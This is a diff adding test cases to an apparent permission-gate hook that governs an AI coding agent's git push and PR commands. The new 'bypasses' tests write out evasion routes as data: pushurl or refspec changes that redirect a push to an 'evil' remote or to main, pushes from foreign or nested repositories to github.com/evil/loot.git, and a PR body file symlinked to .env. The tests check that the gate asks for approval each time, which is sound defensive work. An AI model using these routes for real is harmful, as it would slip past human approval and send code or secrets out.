@@ -1,5 +1,5 @@
 import { execFileSync } from "node:child_process";
-import { readFileSync, writeFileSync } from "node:fs";
+import { mkdirSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import YAML from "yaml";
 import { beforeEach, describe, expect, it } from "vitest";
@@ -116,5 +116,70 @@ describe("push grant re-review: branch names refused at approval", () => {
       expect([branch, a.push]).toEqual([branch, undefined]);
       expect([branch, bash(`git push origin ${branch}`)]).toEqual([branch, "ask"]);
     }
+  });
+});
+
+describe("push grant re-review: bypasses", () => {
+  it("aidw pr --create does not push a run.branch edited after approval", () => {
+    approved();
+    setChange((d) => {
+      d.run = { ...(d.run as object), branch: "main" };
+      d.state = "delivered";
+    });
+    // planPr pushes the branch fixed at approval; the gate still asks while change.yaml disagrees with it
+    expect(JSON.parse(cli("pr", ID, "--json").out).commands[0]).toBe("git push -u origin aidw/app");
+    expect(bash("aidw pr app --create")).toBe("ask");
+  });
+
+  it("asks when a pushurl sends the granted remote elsewhere", () => {
+    withGitRemote();
+    approved();
+    expect(bash("git push origin aidw/app")).toBe("allow");
+    // `git remote get-url` ignores remote.<name>.pushurl; `git push` uses it
+    git(root, "config", "remote.origin.pushurl", "https://github.com/evil/app.git");
+    expect(bash("git push origin aidw/app")).toBe("ask");
+  });
+
+  it("asks when a configured push refspec maps the Change Branch onto another remote branch", () => {
+    withGitRemote();
+    approved();
+    // with remote.origin.push set, `git push origin aidw/app` updates the remote's main
+    git(root, "config", "remote.origin.push", "refs/heads/aidw/app:refs/heads/main");
+    expect(bash("git push origin aidw/app")).toBe("ask");
+  });
+
+  it("asks when the push runs in another repository than the project (CLAUDE_PROJECT_DIR set)", () => {
+    withGitRemote();
+    approved();
+    const other = tempProject();
+    git(other, "init", "-q");
+    git(other, "remote", "add", "origin", "https://github.com/evil/loot.git");
+    // Claude Code sets CLAUDE_PROJECT_DIR for hooks, so the gate finds the project whatever the cwd
+    expect(bashAt("git push origin aidw/app", other, { CLAUDE_PROJECT_DIR: root })).toBe("ask");
+  });
+
+  it("asks when the push runs in a nested repository inside the project", () => {
+    approved();
+    const sub = join(root, "vendor", "loot");
+    mkdirSync(sub, { recursive: true });
+    git(sub, "init", "-q");
+    git(sub, "remote", "add", "origin", "https://github.com/evil/loot.git");
+    expect(bashAt("git push origin aidw/app", sub)).toBe("ask");
+  });
+
+  it("binds no branch named HEAD", () => {
+    // `git push origin HEAD` pushes whatever is checked out, e.g. main
+    approved(() => setChange((d) => (d.run = { branch: "HEAD" })));
+    const a = (YAML.parse(readFileSync(changeFile(), "utf8")) as { approval: { push?: unknown } }).approval;
+    expect(a.push).toBeUndefined();
+    expect(bash("git push origin HEAD")).toBe("ask");
+  });
+
+  it("does not post a body file that is a symlink to .env", () => {
+    approved();
+    write(root, ".env", "SECRET=1\n");
+    mkdirSync(join(root, ".aidw/run"), { recursive: true });
+    symlinkSync(join(root, ".env"), join(root, ".aidw/run/pr-app.md"));
+    expect(bash("gh pr create --base main --head aidw/app --body-file .aidw/run/pr-app.md")).toBe("ask");
   });
 });
